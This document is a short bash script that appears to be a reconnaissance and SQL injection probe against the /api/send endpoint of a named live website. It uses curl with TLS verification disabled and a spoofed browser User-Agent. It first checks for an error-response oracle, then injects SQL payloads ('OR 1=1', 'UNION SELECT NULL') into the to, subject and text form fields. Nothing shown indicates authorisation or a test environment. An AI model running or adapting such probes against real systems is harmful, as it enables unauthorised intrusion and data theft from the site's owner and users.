#!/bin/bash
# stable-oracle probe: does /api/send return the structured 422 JSON or not
UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36'
H=https://www.infinitycapital.bh/api/send
p(){ curl -sk -X POST $H -A "$UA" -H "Content-Type: application/x-www-form-urlencoded" -d "$1" -w "|%{http_code}" 2>/dev/null | tail -c 400; }
echo "== valid=to(email) =="; p 'to=scanner%40nonexistent.invalid&subject=s&text=t'
echo; echo "== invalid=to(nonemail) =="; p 'to=notanemail&subject=s&text=t'
echo; echo "== sqli in to =="; p "to=x%27%20OR%20%271%27%3D%271&subject=s&text=t"
echo; echo "== sqli in subject =="; p "to=scanner%40nonexistent.invalid&subject=x%27%20OR%201%3D1--&text=t"
echo; echo "== sqli in text =="; p "to=scanner%40nonexistent.invalid&subject=s&text=x%27%20UNION%20SELECT%20NULL--"
